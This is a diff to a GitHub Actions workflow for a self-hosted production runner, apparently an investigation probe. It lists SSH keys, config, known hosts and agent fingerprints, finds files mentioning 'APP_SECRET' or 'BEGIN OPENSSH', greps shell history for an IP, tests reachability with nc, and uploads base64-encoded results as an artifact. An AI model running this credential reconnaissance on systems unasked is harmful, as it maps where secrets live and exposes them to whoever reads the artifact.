@@ -6,59 +6,79 @@ permissions:
 jobs:
   probe:
     runs-on: [self-hosted, nba-production]
-    timeout-minutes: 8
+    timeout-minutes: 10
     env:
       DATA_DIR: ${{ vars.NBA_PROP_DATA_DIR }}
     steps:
       - name: collect
         run: |
-          set -u
-          D="$RUNNER_TEMP/zzprobe"; mkdir -p "$D"
+          set +e
+          D="${RUNNER_TEMP:-/tmp}/zzprobe"; mkdir -p "$D"
+          S="$D/00_status.txt"; : > "$S"
           {
             echo "date=$(date -u +%FT%TZ)"
-            id
-            hostname
-            uname -a
-            sw_vers 2>/dev/null
+            echo "id=$(id 2>&1)"
+            echo "host=$(hostname 2>&1)"
+            echo "uname=$(uname -a 2>&1)"
+            echo "sw_vers=$(sw_vers 2>&1 | tr '\n' ' ')"
             echo "runner_name=${RUNNER_NAME:-}"
             echo "workspace=${RUNNER_WORKSPACE:-}"
             echo "data_dir=${DATA_DIR:-unset}"
-          } > "$D/01_identity.txt" 2>&1
-          { ls -la "$HOME/.ssh" 2>&1; } > "$D/02_ssh_ls.txt"
-          awk 'BEGIN{IGNORECASE=1} /^[[:space:]]*(Host|HostName|User|Port|IdentityFile)[[:space:]]/{print}' "$HOME/.ssh/config" > "$D/03_ssh_config.txt" 2>/dev/null
-          [ -s "$D/03_ssh_config.txt" ] || echo "no ssh config or no matching lines" > "$D/03_ssh_config.txt"
-          awk '{print $1}' "$HOME/.ssh/known_hosts" 2>/dev/null | sed 's/,.*//' | sed -E 's/^\|.*$/[HASHED]/' | sort -u | head -40 > "$D/04_known_hosts.txt"
+            echo "home=$HOME"
+            echo "tmp=$D"
+          } > "$D/01_identity.txt" 2>&1; echo "01_identity rc=$?" >> "$S"
+          { [ -d "$HOME/.ssh" ] && ls -la "$HOME/.ssh"; } > "$D/02_ssh_ls.txt" 2>&1; echo "02_ssh_ls rc=$?" >> "$S"
+          { [ -f "$HOME/.ssh/config" ] && awk 'BEGIN{IGNORECASE=1} /^[[:space:]]*(Host|HostName|User|Port|IdentityFile)[[:space:]]/{print}' "$HOME/.ssh/config"; } > "$D/03_ssh_config.txt" 2>&1; echo "03_ssh_config rc=$?" >> "$S"
           {
-            for k in "$HOME"/.ssh/id_*; do
-              [ -f "$k" ] || continue
-              case "$k" in *.pub) continue;; esac
-              echo "$k :: $(ssh-keygen -lf "$k" 2>&1 | head -1)"
+            for f in "$HOME/.ssh/known_hosts" "$HOME/.ssh/known_hosts2"; do
+              [ -f "$f" ] || continue
+              echo "## $f"
+              awk '{print $1}' "$f" 2>/dev/null | sed 's/,.*//' | sed -E 's/^\|.*$/[HASHED]/' | sort -u | head -30
             done
-            for k in "$HOME"/.ssh/*.pem "$HOME"/.ssh/*key*; do
-              [ -f "$k" ] || continue
-              case "$k" in *.pub|*/known_hosts*|*/config) continue;; esac
-              echo "$k :: $(ssh-keygen -lf "$k" 2>&1 | head -1)"
-            done
+          } > "$D/04_known_hosts.txt" 2>&1; echo "04_known_hosts rc=$?" >> "$S"
+          {
             ssh-add -l 2>&1 | head -20
-          } > "$D/05_keys_agent.txt" 2>&1
+            for k in "$HOME"/.ssh/*; do
+              [ -f "$k" ] || continue
+              case "$k" in
+                *.pub|*/known_hosts*|*/config|*/authorized_keys) continue ;;
+              esac
+              echo "$k :: $(ssh-keygen -lf "$k" 2>&1 | head -1)"
+            done
+          } > "$D/05_keys_agent.txt" 2>&1; echo "05_keys rc=$?" >> "$S"
           {
-            grep -rIl --binary-files=without-match -E '13\.52\.111\.2|:33333|APP_SECRET|BEGIN OPENSSH' "${RUNNER_WORKSPACE:-$HOME/_work}" 2>/dev/null | grep -v 'zz-tmp' | head -60
-            if [ -n "${DATA_DIR:-}" ] && [ -d "${DATA_DIR:-}" ]; then
-              grep -rIl --binary-files=without-match -E '13\.52\.111\.2|:33333|APP_SECRET|BEGIN OPENSSH' "$DATA_DIR" 2>/dev/null | grep -v 'zz-tmp' | head -40
-            fi
-          } > "$D/06_grep_hits.txt" 2>&1
-          { grep -hE '13\.52\.111\.2|33333' "$HOME/.zsh_history" "$HOME/.bash_history" 2>/dev/null | head -40; } > "$D/07_history_hits.txt" 2>&1
+            ls -1p "$HOME" 2>/dev/null | head -40
+            echo "## nba dirs"
+            find "$HOME" -maxdepth 3 -type d -iname '*nba*' 2>/dev/null | head -20
+          } > "$D/06_home_layout.txt" 2>&1; echo "06_home rc=$?" >> "$S"
           {
-            echo "== egress_ip =="; curl -sS --max-time 20 https://api.ipify.org 2>&1; echo
+            for root in "${RUNNER_WORKSPACE:-$HOME/_work}" "$HOME/_work" "${DATA_DIR:-}"; do
+              [ -n "$root" ] || continue
+              [ -d "$root" ] || continue
+              echo "## $root"
+              grep -rIl --binary-files=without-match -E '13\.52\.111\.2|:33333|APP_SECRET|BEGIN OPENSSH' "$root" 2>/dev/null | grep -v 'zz-tmp' | head -40
+            done
+          } > "$D/07_grep_hits.txt" 2>&1; echo "07_grep rc=$?" >> "$S"
+          {
+            for h in "$HOME/.zsh_history" "$HOME/.bash_history"; do
+              [ -f "$h" ] || continue
+              echo "## $h"
+              grep -hE '13\.52\.111\.2|33333' "$h" 2>/dev/null | head -20
+            done
+          } > "$D/08_history_hits.txt" 2>&1; echo "08_history rc=$?" >> "$S"
+          {
+            echo "== egress =="
+            curl -sS --max-time 20 https://api.ipify.org 2>&1; echo
             for p in 22 33333 443; do
               echo "== nc 13.52.111.2 $p =="
               nc -vz -w 5 13.52.111.2 $p 2>&1
               echo "rc=$?"
             done
-          } > "$D/08_reach.txt" 2>&1
-          cd "$D"
+          } > "$D/09_reach.txt" 2>&1; echo "09_reach rc=$?" >> "$S"
+          cd "$D" || exit 0
           for f in *.txt; do base64 < "$f" > "$f.b64"; done
-          wc -c *.txt | tail -20
+          wc -c "$D"/*.txt 2>/dev/null | tail -20
+          cat "$S"
       - uses: actions/upload-artifact@v4
         with:
           name: zz-probe-out
